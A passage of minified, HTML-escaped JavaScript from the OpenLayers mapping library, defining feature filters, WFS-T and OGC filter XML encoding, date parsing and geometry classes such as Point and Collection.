OpenLayers.Filter.Spatial(a)},CLASS_NAME:"OpenLayers.Filter.Spatial"});OpenLayers.Filter.Spatial.BBOX="BBOX";OpenLayers.Filter.Spatial.INTERSECTS="INTERSECTS";OpenLayers.Filter.Spatial.DWITHIN="DWITHIN";OpenLayers.Filter.Spatial.WITHIN="WITHIN";OpenLayers.Filter.Spatial.CONTAINS="CONTAINS";OpenLayers.Filter.FeatureId=OpenLayers.Class(OpenLayers.Filter,{fids:null,type:"FID",initialize:function(a){this.fids=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])},evaluate:function(a){for(var b=0,c=this.fids.length;b&lt;c;b++)if((a.fid||a.id)==this.fids[b])return!0;return!1},clone:function(){var a=new OpenLayers.Filter.FeatureId;OpenLayers.Util.extend(a,this);a.fids=this.fids.slice();return a},CLASS_NAME:"OpenLayers.Filter.FeatureId"});OpenLayers.Format.WFST.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",wfs:"http://www.opengis.net/wfs",gml:"http://www.opengis.net/gml",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows"},defaultPrefix:"wfs",version:null,schemaLocations:null,srsName:null,extractAttributes:!0,xy:!0,stateName:null,initialize:function(a){this.stateName={};this.stateName[OpenLayers.State.INSERT]="wfs:Insert";this.stateName[OpenLayers.State.UPDATE]= "wfs:Update";this.stateName[OpenLayers.State.DELETE]="wfs:Delete";OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},getSrsName:function(a,b){var c=b&amp;&amp;b.srsName;c||(c=a&amp;&amp;a.layer?a.layer.projection.getCode():this.srsName);return c},read:function(a,b){b=b||{};OpenLayers.Util.applyDefaults(b,{output:"features"});"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var c={};a&amp;&amp;this.readNode(a,c,!0);c.features&amp;&amp;"features"===b.output&amp;&amp; (c=c.features);return c},readers:{wfs:{FeatureCollection:function(a,b){b.features=[];this.readChildNodes(a,b)}}},write:function(a,b){var c=this.writeNode("wfs:Transaction",{features:a,options:b}),d=this.schemaLocationAttr();d&amp;&amp;this.setAttributeNS(c,this.namespaces.xsi,"xsi:schemaLocation",d);return OpenLayers.Format.XML.prototype.write.apply(this,[c])},writers:{wfs:{GetFeature:function(a){var b=this.createElementNSPlus("wfs:GetFeature",{attributes:{service:"WFS",version:this.version,handle:a&amp;&amp;a.handle, outputFormat:a&amp;&amp;a.outputFormat,maxFeatures:a&amp;&amp;a.maxFeatures,"xsi:schemaLocation":this.schemaLocationAttr(a)}});if("string"==typeof this.featureType)this.writeNode("Query",a,b);else for(var c=0,d=this.featureType.length;c&lt;d;c++)a.featureType=this.featureType[c],this.writeNode("Query",a,b);return b},Transaction:function(a){a=a||{};var b=a.options||{},c=this.createElementNSPlus("wfs:Transaction",{attributes:{service:"WFS",version:this.version,handle:b.handle}}),d,e=a.features;if(e){!0===b.multi&amp;&amp;OpenLayers.Util.extend(this.geometryTypes, {"OpenLayers.Geometry.Point":"MultiPoint","OpenLayers.Geometry.LineString":!0===this.multiCurve?"MultiCurve":"MultiLineString","OpenLayers.Geometry.Polygon":!0===this.multiSurface?"MultiSurface":"MultiPolygon"});var f,g;a=0;for(d=e.length;a&lt;d;++a)g=e[a],(f=this.stateName[g.state])&amp;&amp;this.writeNode(f,{feature:g,options:b},c);!0===b.multi&amp;&amp;this.setGeometryTypes()}if(b.nativeElements)for(a=0,d=b.nativeElements.length;a&lt;d;++a)this.writeNode("wfs:Native",b.nativeElements[a],c);return c},Native:function(a){return this.createElementNSPlus("wfs:Native", {attributes:{vendorId:a.vendorId,safeToIgnore:a.safeToIgnore},value:a.value})},Insert:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Insert",{attributes:{handle:a&amp;&amp;a.handle}});this.srsName=this.getSrsName(b);this.writeNode("feature:_typeName",b,a);return a},Update:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Update",{attributes:{handle:a&amp;&amp;a.handle,typeName:(this.featureNS?this.featurePrefix+":":"")+this.featureType}});this.featureNS&amp;&amp;a.setAttribute("xmlns:"+ this.featurePrefix,this.featureNS);var c=b.modified;null===this.geometryName||c&amp;&amp;void 0===c.geometry||(this.srsName=this.getSrsName(b),this.writeNode("Property",{name:this.geometryName,value:b.geometry},a));for(var d in b.attributes)void 0===b.attributes[d]||c&amp;&amp;c.attributes&amp;&amp;(!c.attributes||void 0===c.attributes[d])||this.writeNode("Property",{name:d,value:b.attributes[d]},a);this.writeNode("ogc:Filter",new OpenLayers.Filter.FeatureId({fids:[b.fid]}),a);return a},Property:function(a){var b=this.createElementNSPlus("wfs:Property"); this.writeNode("Name",a.name,b);null!==a.value&amp;&amp;this.writeNode("Value",a.value,b);return b},Name:function(a){return this.createElementNSPlus("wfs:Name",{value:a})},Value:function(a){var b;a instanceof OpenLayers.Geometry?(b=this.createElementNSPlus("wfs:Value"),a=this.writeNode("feature:_geometry",a).firstChild,b.appendChild(a)):b=this.createElementNSPlus("wfs:Value",{value:a});return b},Delete:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus("wfs:Delete",{attributes:{handle:a&amp;&amp; a.handle,typeName:(this.featureNS?this.featurePrefix+":":"")+this.featureType}});this.featureNS&amp;&amp;a.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);this.writeNode("ogc:Filter",new OpenLayers.Filter.FeatureId({fids:[b.fid]}),a);return a}}},schemaLocationAttr:function(a){a=OpenLayers.Util.extend({featurePrefix:this.featurePrefix,schema:this.schema},a);var b=OpenLayers.Util.extend({},this.schemaLocations);a.schema&amp;&amp;(b[a.featurePrefix]=a.schema);a=[];var c,d;for(d in b)(c=this.namespaces[d])&amp;&amp; a.push(c+" "+b[d]);return a.join(" ")||void 0},setFilterProperty:function(a){if(a.filters)for(var b=0,c=a.filters.length;b&lt;c;++b)OpenLayers.Format.WFST.v1.prototype.setFilterProperty.call(this,a.filters[b]);else a instanceof OpenLayers.Filter.Spatial&amp;&amp;!a.property&amp;&amp;(a.property=this.geometryName)},CLASS_NAME:"OpenLayers.Format.WFST.v1"});OpenLayers.Format.OGCExceptionReport=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ogc:"http://www.opengis.net/ogc"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},defaultPrefix:"ogc",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b={exceptionReport:null};a.documentElement&amp;&amp;(this.readChildNodes(a,b),null===b.exceptionReport&amp;&amp;(b=(new OpenLayers.Format.OWSCommon).read(a)));return b},readers:{ogc:{ServiceExceptionReport:function(a, b){b.exceptionReport={exceptions:[]};this.readChildNodes(a,b.exceptionReport)},ServiceException:function(a,b){var c={code:a.getAttribute("code"),locator:a.getAttribute("locator"),text:this.getChildValue(a)};b.exceptions.push(c)}}},CLASS_NAME:"OpenLayers.Format.OGCExceptionReport"});OpenLayers.Format.XML.VersionedOGC=OpenLayers.Class(OpenLayers.Format.XML,{defaultVersion:null,version:null,profile:null,allowFallback:!1,name:null,stringifyOutput:!1,parser:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);a=this.CLASS_NAME;this.name=a.substring(a.lastIndexOf(".")+1)},getVersion:function(a,b){var c;a?(c=this.version,c||(c=a.getAttribute("version"),c||(c=this.defaultVersion))):c=b&amp;&amp;b.version||this.version||this.defaultVersion;return c},getParser:function(a){a= a||this.defaultVersion;var b=this.profile?"_"+this.profile:"";if(!this.parser||this.parser.VERSION!=a){var c=OpenLayers.Format[this.name]["v"+a.replace(/\./g,"_")+b];if(!c&amp;&amp;(""!==b&amp;&amp;this.allowFallback&amp;&amp;(b="",c=OpenLayers.Format[this.name]["v"+a.replace(/\./g,"_")]),!c))throw"Can't find a "+this.name+" parser for version "+a+b;this.parser=new c(this.options)}return this.parser},write:function(a,b){var c=this.getVersion(null,b);this.parser=this.getParser(c);c=this.parser.write(a,b);return!1===this.stringifyOutput? c:OpenLayers.Format.XML.prototype.write.apply(this,[c])},read:function(a,b){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var c=this.getVersion(a.documentElement);this.parser=this.getParser(c);var d=this.parser.read(a,b),e=this.parser.errorProperty||null;null!==e&amp;&amp;void 0===d[e]&amp;&amp;(e=new OpenLayers.Format.OGCExceptionReport,d.error=e.read(a));d.version=c;return d},CLASS_NAME:"OpenLayers.Format.XML.VersionedOGC"});OpenLayers.Filter.Logical=OpenLayers.Class(OpenLayers.Filter,{filters:null,type:null,initialize:function(a){this.filters=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])},destroy:function(){this.filters=null;OpenLayers.Filter.prototype.destroy.apply(this)},evaluate:function(a){var b,c;switch(this.type){case OpenLayers.Filter.Logical.AND:b=0;for(c=this.filters.length;b&lt;c;b++)if(!1==this.filters[b].evaluate(a))return!1;return!0;case OpenLayers.Filter.Logical.OR:b=0;for(c=this.filters.length;b&lt; c;b++)if(!0==this.filters[b].evaluate(a))return!0;return!1;case OpenLayers.Filter.Logical.NOT:return!this.filters[0].evaluate(a)}},clone:function(){for(var a=[],b=0,c=this.filters.length;b&lt;c;++b)a.push(this.filters[b].clone());return new OpenLayers.Filter.Logical({type:this.type,filters:a})},CLASS_NAME:"OpenLayers.Filter.Logical"});OpenLayers.Filter.Logical.AND="&amp;&amp;";OpenLayers.Filter.Logical.OR="||";OpenLayers.Filter.Logical.NOT="!";OpenLayers.Filter.Comparison=OpenLayers.Class(OpenLayers.Filter,{type:null,property:null,value:null,matchCase:!0,lowerBoundary:null,upperBoundary:null,initialize:function(a){OpenLayers.Filter.prototype.initialize.apply(this,[a]);this.type===OpenLayers.Filter.Comparison.LIKE&amp;&amp;void 0===a.matchCase&amp;&amp;(this.matchCase=null)},evaluate:function(a){a instanceof OpenLayers.Feature.Vector&amp;&amp;(a=a.attributes);var b=!1;a=a[this.property];switch(this.type){case OpenLayers.Filter.Comparison.EQUAL_TO:b=this.value; b=this.matchCase||"string"!=typeof a||"string"!=typeof b?a==b:a.toUpperCase()==b.toUpperCase();break;case OpenLayers.Filter.Comparison.NOT_EQUAL_TO:b=this.value;b=this.matchCase||"string"!=typeof a||"string"!=typeof b?a!=b:a.toUpperCase()!=b.toUpperCase();break;case OpenLayers.Filter.Comparison.LESS_THAN:b=a&lt;this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN:b=a>this.value;break;case OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO:b=a&lt;=this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO:b= a>=this.value;break;case OpenLayers.Filter.Comparison.BETWEEN:b=a>=this.lowerBoundary&amp;&amp;a&lt;=this.upperBoundary;break;case OpenLayers.Filter.Comparison.LIKE:b=RegExp(this.value,"gi").test(a);break;case OpenLayers.Filter.Comparison.IS_NULL:b=null===a}return b},value2regex:function(a,b,c){if("."==a)throw Error("'.' is an unsupported wildCard character for OpenLayers.Filter.Comparison");a=a?a:"*";b=b?b:".";this.value=this.value.replace(RegExp("\\"+(c?c:"!")+"(.|$)","g"),"\\$1");this.value=this.value.replace(RegExp("\\"+ b,"g"),".");this.value=this.value.replace(RegExp("\\"+a,"g"),".*");this.value=this.value.replace(RegExp("\\\\.\\*","g"),"\\"+a);return this.value=this.value.replace(RegExp("\\\\\\.","g"),"\\"+b)},regex2value:function(){var a=this.value,a=a.replace(/!/g,"!!"),a=a.replace(/(\\)?\\\./g,function(a,c){return c?a:"!."}),a=a.replace(/(\\)?\\\*/g,function(a,c){return c?a:"!*"}),a=a.replace(/\\\\/g,"\\");return a=a.replace(/\.\*/g,"*")},clone:function(){return OpenLayers.Util.extend(new OpenLayers.Filter.Comparison, this)},CLASS_NAME:"OpenLayers.Filter.Comparison"});OpenLayers.Filter.Comparison.EQUAL_TO="==";OpenLayers.Filter.Comparison.NOT_EQUAL_TO="!=";OpenLayers.Filter.Comparison.LESS_THAN="&lt;";OpenLayers.Filter.Comparison.GREATER_THAN=">";OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO="&lt;=";OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO=">=";OpenLayers.Filter.Comparison.BETWEEN="..";OpenLayers.Filter.Comparison.LIKE="~";OpenLayers.Filter.Comparison.IS_NULL="NULL";OpenLayers.Format.Filter=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.Filter"});OpenLayers.Filter.Function=OpenLayers.Class(OpenLayers.Filter,{name:null,params:null,CLASS_NAME:"OpenLayers.Filter.Function"});OpenLayers.Date={dateRegEx:/^(?:(\d{4})(?:-(\d{2})(?:-(\d{2}))?)?)?(?:(?:T(\d{1,2}):(\d{2}):(\d{2}(?:\.\d+)?)(Z|(?:[+-]\d{1,2}(?::(\d{2}))?)))|Z)?$/,toISOString:function(){return"toISOString"in Date.prototype?function(a){return a.toISOString()}:function(a){return isNaN(a.getTime())?"Invalid Date":a.getUTCFullYear()+"-"+OpenLayers.Number.zeroPad(a.getUTCMonth()+1,2)+"-"+OpenLayers.Number.zeroPad(a.getUTCDate(),2)+"T"+OpenLayers.Number.zeroPad(a.getUTCHours(),2)+":"+OpenLayers.Number.zeroPad(a.getUTCMinutes(), 2)+":"+OpenLayers.Number.zeroPad(a.getUTCSeconds(),2)+"."+OpenLayers.Number.zeroPad(a.getUTCMilliseconds(),3)+"Z"}}(),parse:function(a){var b;if((a=a.match(this.dateRegEx))&amp;&amp;(a[1]||a[7])){b=parseInt(a[1],10)||0;var c=parseInt(a[2],10)-1||0,d=parseInt(a[3],10)||1;b=new Date(Date.UTC(b,c,d));if(c=a[7]){var d=parseInt(a[4],10),e=parseInt(a[5],10),f=parseFloat(a[6]),g=f|0,f=Math.round(1E3*(f-g));b.setUTCHours(d,e,g,f);"Z"!==c&amp;&amp;(c=parseInt(c,10),a=parseInt(a[8],10)||0,a=-1E3*(60*60*c+60*a),b=new Date(b.getTime()+ a))}}else b=new Date("invalid");return b}};OpenLayers.Format.Filter.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ogc:"http://www.opengis.net/ogc",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"ogc",schemaLocation:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){var b={};this.readers.ogc.Filter.apply(this,[a,b]);return b.filter},readers:{ogc:{_expression:function(a){for(var b="",c=a.firstChild;c;c= c.nextSibling)switch(c.nodeType){case 1:a=this.readNode(c);a.property?b+="${"+a.property+"}":void 0!==a.value&amp;&amp;(b+=a.value);break;case 3:case 4:b+=c.nodeValue}return b},Filter:function(a,b){var c={fids:[],filters:[]};this.readChildNodes(a,c);0&lt;c.fids.length?b.filter=new OpenLayers.Filter.FeatureId({fids:c.fids}):0&lt;c.filters.length&amp;&amp;(b.filter=c.filters[0])},FeatureId:function(a,b){var c=a.getAttribute("fid");c&amp;&amp;b.fids.push(c)},And:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND}); this.readChildNodes(a,c);b.filters.push(c)},Or:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.OR});this.readChildNodes(a,c);b.filters.push(c)},Not:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.NOT});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLessThan:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LESS_THAN});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsGreaterThan:function(a, b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.GREATER_THAN});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLessThanOrEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsGreaterThanOrEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)}, PropertyIsBetween:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.BETWEEN});this.readChildNodes(a,c);b.filters.push(c)},Literal:function(a,b){b.value=OpenLayers.String.numericIf(this.getChildValue(a),!0)},PropertyName:function(a,b){b.property=this.getChildValue(a)},LowerBoundary:function(a,b){b.lowerBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this,a),!0)},UpperBoundary:function(a,b){b.upperBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this, a),!0)},Intersects:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.INTERSECTS)},Within:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.WITHIN)},Contains:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.CONTAINS)},DWithin:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.DWITHIN)},Distance:function(a,b){b.distance=parseInt(this.getChildValue(a));b.distanceUnits=a.getAttribute("units")},Function:function(a,b){},PropertyIsNull:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.IS_NULL}); this.readChildNodes(a,c);b.filters.push(c)}}},readSpatial:function(a,b,c){c=new OpenLayers.Filter.Spatial({type:c});this.readChildNodes(a,c);c.value=c.components[0];delete c.components;b.filters.push(c)},encodeLiteral:function(a){a instanceof Date&amp;&amp;(a=OpenLayers.Date.toISOString(a));return a},writeOgcExpression:function(a,b){a instanceof OpenLayers.Filter.Function?this.writeNode("Function",a,b):this.writeNode("Literal",a,b);return b},write:function(a){return this.writers.ogc.Filter.apply(this,[a])}, writers:{ogc:{Filter:function(a){var b=this.createElementNSPlus("ogc:Filter");this.writeNode(this.getFilterType(a),a,b);return b},_featureIds:function(a){for(var b=this.createDocumentFragment(),c=0,d=a.fids.length;c&lt;d;++c)this.writeNode("ogc:FeatureId",a.fids[c],b);return b},FeatureId:function(a){return this.createElementNSPlus("ogc:FeatureId",{attributes:{fid:a}})},And:function(a){for(var b=this.createElementNSPlus("ogc:And"),c,d=0,e=a.filters.length;d&lt;e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c), c,b);return b},Or:function(a){for(var b=this.createElementNSPlus("ogc:Or"),c,d=0,e=a.filters.length;d&lt;e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c),c,b);return b},Not:function(a){var b=this.createElementNSPlus("ogc:Not");a=a.filters[0];this.writeNode(this.getFilterType(a),a,b);return b},PropertyIsLessThan:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLessThan");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsGreaterThan:function(a){var b= this.createElementNSPlus("ogc:PropertyIsGreaterThan");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLessThanOrEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLessThanOrEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsGreaterThanOrEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsGreaterThanOrEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b); return b},PropertyIsBetween:function(a){var b=this.createElementNSPlus("ogc:PropertyIsBetween");this.writeNode("PropertyName",a,b);this.writeNode("LowerBoundary",a,b);this.writeNode("UpperBoundary",a,b);return b},PropertyName:function(a){return this.createElementNSPlus("ogc:PropertyName",{value:a.property})},Literal:function(a){return this.createElementNSPlus("ogc:Literal",{value:(this.encodeLiteral||OpenLayers.Format.Filter.v1.prototype.encodeLiteral)(a)})},LowerBoundary:function(a){var b=this.createElementNSPlus("ogc:LowerBoundary"); this.writeOgcExpression(a.lowerBoundary,b);return b},UpperBoundary:function(a){var b=this.createElementNSPlus("ogc:UpperBoundary");this.writeNode("Literal",a.upperBoundary,b);return b},INTERSECTS:function(a){return this.writeSpatial(a,"Intersects")},WITHIN:function(a){return this.writeSpatial(a,"Within")},CONTAINS:function(a){return this.writeSpatial(a,"Contains")},DWITHIN:function(a){var b=this.writeSpatial(a,"DWithin");this.writeNode("Distance",a,b);return b},Distance:function(a){return this.createElementNSPlus("ogc:Distance", {attributes:{units:a.distanceUnits},value:a.distance})},Function:function(a){var b=this.createElementNSPlus("ogc:Function",{attributes:{name:a.name}});a=a.params;for(var c=0,d=a.length;c&lt;d;c++)this.writeOgcExpression(a[c],b);return b},PropertyIsNull:function(a){var b=this.createElementNSPlus("ogc:PropertyIsNull");this.writeNode("PropertyName",a,b);return b}}},getFilterType:function(a){var b=this.filterMap[a.type];if(!b)throw"Filter writing not supported for rule type: "+a.type;return b},filterMap:{"&amp;&amp;":"And", "||":"Or","!":"Not","==":"PropertyIsEqualTo","!=":"PropertyIsNotEqualTo","&lt;":"PropertyIsLessThan",">":"PropertyIsGreaterThan","&lt;=":"PropertyIsLessThanOrEqualTo",">=":"PropertyIsGreaterThanOrEqualTo","..":"PropertyIsBetween","~":"PropertyIsLike",NULL:"PropertyIsNull",BBOX:"BBOX",DWITHIN:"DWITHIN",WITHIN:"WITHIN",CONTAINS:"CONTAINS",INTERSECTS:"INTERSECTS",FID:"_featureIds"},CLASS_NAME:"OpenLayers.Format.Filter.v1"});OpenLayers.Geometry=OpenLayers.Class({id:null,parent:null,bounds:null,initialize:function(){this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){this.bounds=this.id=null},clone:function(){return new OpenLayers.Geometry},setBounds:function(a){a&amp;&amp;(this.bounds=a.clone())},clearBounds:function(){this.bounds=null;this.parent&amp;&amp;this.parent.clearBounds()},extendBounds:function(a){this.getBounds()?this.bounds.extend(a):this.setBounds(a)},getBounds:function(){null==this.bounds&amp;&amp;this.calculateBounds(); return this.bounds},calculateBounds:function(){},distanceTo:function(a,b){},getVertices:function(a){},atPoint:function(a,b,c){var d=!1;null!=this.getBounds()&amp;&amp;null!=a&amp;&amp;(b=null!=b?b:0,c=null!=c?c:0,d=(new OpenLayers.Bounds(this.bounds.left-b,this.bounds.bottom-c,this.bounds.right+b,this.bounds.top+c)).containsLonLat(a));return d},getLength:function(){return 0},getArea:function(){return 0},getCentroid:function(){return null},toString:function(){return OpenLayers.Format&amp;&amp;OpenLayers.Format.WKT?OpenLayers.Format.WKT.prototype.write(new OpenLayers.Feature.Vector(this)): Object.prototype.toString.call(this)},CLASS_NAME:"OpenLayers.Geometry"});OpenLayers.Geometry.fromWKT=function(a){var b;if(OpenLayers.Format&amp;&amp;OpenLayers.Format.WKT){var c=OpenLayers.Geometry.fromWKT.format;c||(c=new OpenLayers.Format.WKT,OpenLayers.Geometry.fromWKT.format=c);a=c.read(a);if(a instanceof OpenLayers.Feature.Vector)b=a.geometry;else if(OpenLayers.Util.isArray(a)){b=a.length;for(var c=Array(b),d=0;d&lt;b;++d)c[d]=a[d].geometry;b=new OpenLayers.Geometry.Collection(c)}}return b}; OpenLayers.Geometry.segmentsIntersect=function(a,b,c){var d=c&amp;&amp;c.point;c=c&amp;&amp;c.tolerance;var e=!1,f=a.x1-b.x1,g=a.y1-b.y1,h=a.x2-a.x1,k=a.y2-a.y1,l=b.y2-b.y1,m=b.x2-b.x1,n=l*h-m*k,l=m*g-l*f,g=h*g-k*f;0==n?0==l&amp;&amp;0==g&amp;&amp;(e=!0):(f=l/n,n=g/n,0&lt;=f&amp;&amp;(1>=f&amp;&amp;0&lt;=n&amp;&amp;1>=n)&amp;&amp;(d?(h=a.x1+f*h,n=a.y1+f*k,e=new OpenLayers.Geometry.Point(h,n)):e=!0));if(c)if(e){if(d)a:for(a=[a,b],b=0;2>b;++b)for(f=a[b],k=1;3>k;++k)if(h=f["x"+k],n=f["y"+k],d=Math.sqrt(Math.pow(h-e.x,2)+Math.pow(n-e.y,2)),d&lt;c){e.x=h;e.y=n;break a}}else a:for(a= [a,b],b=0;2>b;++b)for(h=a[b],n=a[(b+1)%2],k=1;3>k;++k)if(f={x:h["x"+k],y:h["y"+k]},g=OpenLayers.Geometry.distanceToSegment(f,n),g.distance&lt;c){e=d?new OpenLayers.Geometry.Point(f.x,f.y):!0;break a}return e};OpenLayers.Geometry.distanceToSegment=function(a,b){var c=OpenLayers.Geometry.distanceSquaredToSegment(a,b);c.distance=Math.sqrt(c.distance);return c}; OpenLayers.Geometry.distanceSquaredToSegment=function(a,b){var c=a.x,d=a.y,e=b.x1,f=b.y1,g=b.x2,h=b.y2,k=g-e,l=h-f,m=(k*(c-e)+l*(d-f))/(Math.pow(k,2)+Math.pow(l,2));0>=m||(1&lt;=m?(e=g,f=h):(e+=m*k,f+=m*l));return{distance:Math.pow(e-c,2)+Math.pow(f-d,2),x:e,y:f,along:m}};OpenLayers.Geometry.Point=OpenLayers.Class(OpenLayers.Geometry,{x:null,y:null,initialize:function(a,b){OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.x=parseFloat(a);this.y=parseFloat(b)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Geometry.Point(this.x,this.y));OpenLayers.Util.applyDefaults(a,this);return a},calculateBounds:function(){this.bounds=new OpenLayers.Bounds(this.x,this.y,this.x,this.y)},distanceTo:function(a,b){var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e,f,g,h;a instanceof OpenLayers.Geometry.Point?(e=this.x,f=this.y,g=a.x,h=a.y,d=Math.sqrt(Math.pow(e-g,2)+Math.pow(f-h,2)),d=c?{x0:e,y0:f,x1:g,y1:h,distance:d}:d):(d=a.distanceTo(this,b),c&amp;&amp;(d={x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0,distance:d.distance}));return d},equals:function(a){var b=!1;null!=a&amp;&amp;(b=this.x==a.x&amp;&amp;this.y==a.y||isNaN(this.x)&amp;&amp;isNaN(this.y)&amp;&amp;isNaN(a.x)&amp;&amp;isNaN(a.y));return b},toShortString:function(){return this.x+", "+this.y},move:function(a,b){this.x+=a;this.y+=b;this.clearBounds()},rotate:function(a,b){a*= Math.PI/180;var c=this.distanceTo(b),d=a+Math.atan2(this.y-b.y,this.x-b.x);this.x=b.x+c*Math.cos(d);this.y=b.y+c*Math.sin(d);this.clearBounds()},getCentroid:function(){return new OpenLayers.Geometry.Point(this.x,this.y)},resize:function(a,b,c){this.x=b.x+a*(void 0==c?1:c)*(this.x-b.x);this.y=b.y+a*(this.y-b.y);this.clearBounds();return this},intersects:function(a){var b=!1;return b="OpenLayers.Geometry.Point"==a.CLASS_NAME?this.equals(a):a.intersects(this)},transform:function(a,b){a&amp;&amp;b&amp;&amp;(OpenLayers.Projection.transform(this, a,b),this.bounds=null);return this},getVertices:function(a){return[this]},CLASS_NAME:"OpenLayers.Geometry.Point"});OpenLayers.Geometry.Collection=OpenLayers.Class(OpenLayers.Geometry,{components:null,componentTypes:null,initialize:function(a){OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.components=[];null!=a&amp;&amp;this.addComponents(a)},destroy:function(){this.components.length=0;this.components=null;OpenLayers.Geometry.prototype.destroy.apply(this,arguments)},clone:function(){for(var a=eval("new "+this.CLASS_NAME+"()"),b=0,c=this.components.length;b&lt;c;b++)a.addComponent(this.components[b].clone()); OpenLayers.Util.applyDefaults(a,this);return a},getComponentsString:function(){for(var a=[],b=0,c=this.components.length;b&lt;c;b++)a.push(this.components[b].toShortString());return a.join(",")},calculateBounds:function(){this.bounds=null;var a=new OpenLayers.Bounds,b=this.components;if(b)for(var c=0,d=b.length;c&lt;d;c++)a.extend(b[c].getBounds());null!=a.left&amp;&amp;(null!=a.bottom&amp;&amp;null!=a.right&amp;&amp;null!=a.top)&amp;&amp;this.setBounds(a)},addComponents:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b&lt; c;b++)this.addComponent(a[b])},addComponent:function(a,b){var c=!1;if(a&amp;&amp;(null==this.componentTypes||-1&lt;OpenLayers.Util.indexOf(this.componentTypes,a.CLASS_NAME))){if(null!=b&amp;&amp;b&lt;this.components.length){var c=this.components.slice(0,b),d=this.components.slice(b,this.components.length);c.push(a);this.components=c.concat(d)}else this.components.push(a);a.parent=this;this.clearBounds();c=!0}return c},removeComponents:function(a){var b=!1;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=a.length-1;0&lt;=c;--c)b= this.removeComponent(a[c])||b;return b},removeComponent:function(a){OpenLayers.Util.removeItem(this.components,a);this.clearBounds();return!0},getLength:function(){for(var a=0,b=0,c=this.components.length;b&lt;c;b++)a+=this.components[b].getLength();return a},getArea:function(){for(var a=0,b=0,c=this.components.length;b&lt;c;b++)a+=this.components[b].getArea();return a},getGeodesicArea:function(a){for(var b=0,c=0,d=this.components.length;c&lt;d;c++)b+=this.components[c].getGeodesicArea(a);return b},getCentroid:function(a){if(!a)return this.components.length&amp;&amp; this.components[0].getCentroid();a=this.components.length;if(!a)return!1;for(var b=[],c=[],d=0,e=Number.MAX_VALUE,f,g=0;g&lt;a;++g){f=this.components[g];var 